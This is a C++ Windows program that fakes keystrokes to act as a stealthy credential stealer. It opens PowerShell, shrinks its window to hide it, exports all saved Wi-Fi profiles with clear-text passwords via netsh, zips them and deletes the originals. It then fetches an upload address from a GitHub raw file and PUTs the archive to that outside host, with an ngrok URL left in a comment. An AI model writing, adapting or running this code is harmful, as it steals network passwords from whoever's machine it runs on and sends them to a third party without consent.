#include <iostream>

/* run this program using the console pauser or add your own getch, system("pause") or input loop */

#include <windows.h>

void babu(DWORD val,int delay,int captilized,DWORD val2)
{
	 Sleep(delay);
 INPUT ip;
 // Set up a generic keyboard event.
    ip.type = INPUT_KEYBOARD;
    ip.ki.wScan = 0; // hardware scan code for key
    ip.ki.time = 0;
    ip.ki.dwExtraInfo = 0;
if(captilized==1){
 ip.ki.dwFlags = 0;
 ip.ki.wVk =val2;
  SendInput(1, &ip, sizeof(INPUT));

    // Press the "A" key
    ip.ki.wVk =val; //0x5B;
// 0x41; // virtual-key code for the "a" key
    ip.ki.dwFlags = 0; // 0 for key press
    SendInput(1, &ip, sizeof(INPUT));

    // Release the "A" key
    ip.ki.dwFlags = KEYEVENTF_KEYUP; // KEYEVENTF_KEYUP for key release
    SendInput(1, &ip, sizeof(INPUT));	
     ip.ki.wVk =val2;
     ip.ki.dwFlags = KEYEVENTF_KEYUP; // KEYEVENTF_KEYUP for key release
    SendInput(1, &ip, sizeof(INPUT));
    
}else{
 ip.ki.wVk =val; //0x5B;
// 0x41; // virtual-key code for the "a" key
    ip.ki.dwFlags = 0; // 0 for key press
    SendInput(1, &ip, sizeof(INPUT));

    // Release the "A" key
    ip.ki.dwFlags = KEYEVENTF_KEYUP; // KEYEVENTF_KEYUP for key release
    SendInput(1, &ip, sizeof(INPUT));	
}
}
void toClipboard(HWND hwnd, const std::string &s);
void toClipboard(HWND hwnd, const std::string &s){
	OpenClipboard(hwnd);
	EmptyClipboard();
	HGLOBAL hg=GlobalAlloc(GMEM_MOVEABLE,s.size()+1);
	if (!hg){
		CloseClipboard();
		return;
	}
	memcpy(GlobalLock(hg),s.c_str(),s.size()+1);
	GlobalUnlock(hg);
	SetClipboardData(CF_TEXT,hg);
	CloseClipboard();
	GlobalFree(hg);
}
void myinput(HWND hwnd,std::string &s)
{
		toClipboard(hwnd, s);
	DWORD val2=0x11;
	 babu(0x56,10,1,val2);
	 Sleep(200);
	 	 babu(0x0D,100,0,0);
	 	 
	
}
int main()
{
    // This structure will be used to create the keyboard
    // input event.
    
   HWND hwnd = GetDesktopWindow();
  
    // Pause for 5 seconds.
    Sleep(400);
    //0x5B/*win*/,0x52/*r*/,0x55/*u*/,0x4E/*n*/,0x0D/*enter*/,
    babu(0x5B,30,0,0);
    Sleep(500);
    std::string rn="run";
myinput(hwnd,rn);
Sleep(2000);
    
     std::string  ps="powershell ";
   
myinput(hwnd,ps);
Sleep(3000);
std::string window="$pshost = get-host;$pswindow = $pshost.ui.rawui;$newsize = $pswindow.buffersize;$newsize.height = 5;$newsize.width = 5;$pswindow.buffersize = $newsize;$newsize = $pswindow.windowsize;$newsize.height = 5;$newsize.width = 5;$pswindow.windowsize = $newsize";	 	  
myinput(hwnd,window);

std::string  netsh="netsh wlan export profile key=clear";
	 	  
myinput(hwnd,netsh);
Sleep(500);
 std::string  c2="compress-archive -u -path *.xml -destinationpath bl";
myinput(hwnd,c2);
Sleep(2000);
 std::string  c3="rm *.xml";
myinput(hwnd,c3);
 std::string  cls="cls";
myinput(hwnd,cls);
Sleep(100);

//https://raw.githubusercontent.com/nijasec/prof/main/dom
//http://d0bebb516398.ngrok.io
std::string dom="$dom=invoke-webrequest('https://raw.githubusercontent.com/nijasec/prof/main/dom')";
myinput(hwnd,dom);
Sleep(200);
 std::string  c4="invoke-restmethod -uri $dom.ToString() -method put -infile bl.zip";
myinput(hwnd,c4);

 std::string  c5="exit";
Sleep(200);
myinput(hwnd,c5);
myinput(hwnd,c5);

	return 0;
DWORD ar[]={0x50/*p*/,0x4F/*o*/,0x57/*w*/,0x45/*e*/,0x52,0x53/*s*/,0x48/*h*/,0x45,0x4C/*L*/,0x4C,0x0D};
int sz=*(&ar + 1) - ar;
for(int i=0;i<sz;i++){

   babu(ar[i],300,0,0);
   
}

Sleep(4000);
DWORD ar2[]={0x4E,0x45,0x54/*t*/,0x53,0x48,0x20/*space*/,0x57,0x4C,0x41/*A*/,0x4E,0x20,0x45,0x58/*x*/,0x50,0x4F,0x52,0x54,0x20,0x50,0x52,0x4F,0x46/*f*/,0x49/*I*/,0x4C,0x45,0x20,0x4B/*K*/,0x45,0x59/*Y*/,0xBB/*=*/,0x43/*c*/,0x4C,0x45,0x41,0x52,0x0D,
			0x43,0x4F,0x4D/*m*/,0x50,0x52,0x45,0x53,0x53,0x6D,0x41,0x52,0x43,0x48,0x49,0x56/*v*/,0x45,0x20,0x6D,0x55,0x20,0x6D/*-*/,0x50,0x41,0x54,0x48,0x20,0x6A/***/,0xBE/*.*/,0x58,0x4D,0x4C,0x20,0x6D,0x44,0x45,0x53,0x54,0x49,0x4E,0x41,0x54,0x49,0x4F
			,0x4E,0x50,0x41,0x54,0x48,0x20,0x42,0x4C,0x0D,0x52,0x4D,0x20,0x6A/***/,0xBE/*.*/,0x58,0x4D,0x4C,0x0D,0x49,0x4E,0x56,0x4F,0x4B,0x45,0x6D,0x52,0x45,0x53,0x54,0x4D,0x45,0x54,0x48,0x4F,0x44,0x20,0x6D,0x55/*u*/,0x52,0x49,0x20,0x48,0x54
			,0x54,0x50};
			
sz=*(&ar2 + 1) - ar2;
for(int i=0;i<sz;i++){

   babu(ar2[i],10,0,0);
   
}

babu(0xBA/*:*/,10,1,0x10);
DWORD ar3[]={0x6F,0x6F/*/*/,0x48,0x45,0x4C,0x4C,0x4F,0xBE,0x4C,0x4F,0x43,0x41,0xBE,0x4C,0x54,0x20,0x6D,0x4D,0x45,0x54,0x48,0x4F,0x44,0x20,0x50,0x55,0x54,0x20,0x6D,0x49,0x4E,0x46,0x49,
			0x4C,0x45,0x20,0x42,0x4C,0xBE,0x5A/*z*/,0x49,0x50,0x0D,0x45,0x58,0x49,0x54,0x0D};
			
	sz=*(&ar3 + 1) - ar3;
for(int i=0;i<sz;i++){

   babu(ar3[i],10,0,0);
   
}		

//babu(VK_OEM_PLUS,30,1);

   // keypress(0x52);
    // Exit normally
    return 0;
}

